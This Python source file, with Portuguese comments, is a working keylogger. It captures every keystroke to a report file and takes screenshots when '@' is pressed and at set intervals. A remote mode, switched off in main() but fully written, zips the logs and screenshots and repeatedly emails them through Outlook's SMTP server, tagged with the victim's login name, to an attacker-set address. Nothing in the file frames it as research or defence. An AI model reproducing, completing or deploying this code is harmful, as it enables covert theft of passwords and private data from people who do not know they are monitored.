import pyautogui
import keyboard
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from threading import Thread
import zipfile
import os

def modo_local(settings:dict):
    txt = ""
    lista_caracteres = ["q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","ç","z","x","c","v",
    "b","n","m","Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Ç","Z","X","C","V","B","N",
    "M","1","2","3","4","5","6","7","8","9","0","@","?",".",",","\\","/","*","+","-",":",";","<",">","|","^","~","´","`",
    "(",")","_","-","=","!","#","$","%","¨","&","º","§","[", "]","{","}","°","'",'"',"£","¬"]
    caractere_por_linha = 0
    arq = open("report.txt", "w")
    count = 0
    caractere = ""
    right_now_screenshot = time.time()
    
    while True:
        caractere = keyboard.read_key()

        if caractere not in lista_caracteres:
            caractere = "  |" + caractere + "|  "
            caractere_por_linha += 12
            count += 1

        txt += caractere
        count += 1
        caractere_por_linha += 1
        
        if settings["screenshots"] == "yes":
            if caractere == "@": #tira printscreenshot
                pyautogui.screenshot("report/" + str(time.time()) + ".png")
                print("pressionou @ e tirou um print")       

            if int(time.time()) - int(right_now_screenshot) >= int(settings["screenshot interval"]):
                pyautogui.screenshot("report/" + str(time.time()) + ".png")
                right_now_screenshot = time.time()
                print("passou o tempo e tirou um print")

        print(count)
        if count % 5 == 0:
            if count % 90 == 0 or caractere_por_linha >= 90:
                caractere_por_linha = 0
                txt += "\n"

            arq.write(txt)
    


def modo_remoto(settings:dict):
    txt = ""
    lista_caracteres = ["q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","ç","z","x","c","v",
    "b","n","m","Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Ç","Z","X","C","V","B","N",
    "M","1","2","3","4","5","6","7","8","9","0","@","?",".",",","\\","/","*","+","-",":",";","<",">","|","^","~","´","`",
    "(",")","_","-","=","!","#","$","%","¨","&","º","§","[", "]","{","}","°","'",'"',"£","¬"]
    caractere_por_linha = 0
    arq = open("report.txt", "w")
    count = 0
    caractere = ""
    right_now_screenshot = time.time()
    right_now_email = time.time()

    compactar = True
    if settings["screenshots"] == "no":
        compactar = False

    t_email = Thread(target=send_email, args=[settings["email"], settings["password"], int(settings["email interval"]), settings["to"], compactar])
    t_email.start()
    while True:#envia por email e tira screenshot
        caractere = keyboard.read_key()
        if caractere not in lista_caracteres:
            caractere = "  |" + caractere + "|  "
            caractere_por_linha += 12
            count += 1
        
        txt += caractere
        count += 1
        caractere_por_linha += 1

        if settings["screenshots"] == "yes":
            if caractere == "@": #tira printscreenshot
                pyautogui.screenshot("report/" + str(time.time()) + ".png")
                print("pressionou @ e tirou um print")                

            if int(time.time()) - int(right_now_screenshot) >= int(settings["screenshot interval"]):
                pyautogui.screenshot("report/" + str(time.time()) + ".png")
                right_now_screenshot = time.time()
                print("passou o tempo e tirou um print")

        if int(time.time()) - int(right_now_email) + 5 >= int(settings["email interval"]):#5 segundos antes ele atualiza o documento
            arq_aux = open("report_copy.txt", "w")
            arq_aux.write(txt)
            arq_aux.close()
            right_now_email = time.time()
            
        print(count)
        if count % 5 == 0:
            if count % 90 == 0 or caractere_por_linha >= 90:
                caractere_por_linha = 0
                txt += "\n"

            arq.write(txt)

def compactar_arquivos():
    for raiz, diretorios, arquivos in os.walk("."):
        if len(diretorios) == 0:
            z = zipfile.ZipFile("logs.zip", "w", zipfile.ZIP_DEFLATED)
            for i in arquivos:
                z.write("./report/" + i)
            z.write("report_copy.txt")
            z.close()
            break

def send_email(user:str, password:str, frequency:int, to:str, compactar:bool):
    while True:
        time.sleep(frequency)
        if compactar == True:
            compactar_arquivos()
        host = "smtp-mail.outlook.com"
        port = 587

        # Criando objeto
        print('Criando objeto servidor...')
        server = smtplib.SMTP(host, port)

        # Login com servidor
        print('Login...')
        server.ehlo()
        server.starttls()
        server.login(user, password)

        # Criando mensagem
        message = 'logs da maquina do usuario: ' + os.getlogin()
        print('Criando mensagem...')
        email_msg = MIMEMultipart()
        email_msg['From'] = user
        email_msg['To'] = to
        email_msg['Subject'] = os.getlogin()
        print('Adicionando texto...')
        email_msg.attach(MIMEText(message, 'plain'))

        print('Obtendo arquivo...')
        filename = ""
        if compactar == False:
            filename = 'report_copy.txt'
        else:
            filename = 'logs.zip'
        
        attachment = open(filename, 'rb')

        print('Lendo arquivo...')
        att = MIMEBase('application', 'octet-stream')
        att.set_payload(attachment.read())
        encoders.encode_base64(att)
        att.add_header('Content-Disposition', f'attachment; filename= {filename}')

        attachment.close()
        print('Adicionando arquivo ao email...')
        email_msg.attach(att)

        # Enviando mensagem
        print('Enviando mensagem...')
        server.sendmail(email_msg['From'], email_msg['To'], email_msg.as_string())
        print('Mensagem enviada!')
        server.quit()
        
def carregar_settings():
    settings = {}
    arq = open("settings.txt", "r")
    txt = arq.read()
    arq.close()

    txt_split = txt.split("\n")

    for i in txt_split:
        settings[i.split("=")[0].strip()] = i.split("=")[1].strip()

    return settings

def main():
    #verificar se vai ser local ou remoto!
    settings = {}
    settings = carregar_settings()
    #modo_remoto(settings)
    modo_local(settings)

    
        
if __name__ == "__main__":
    main()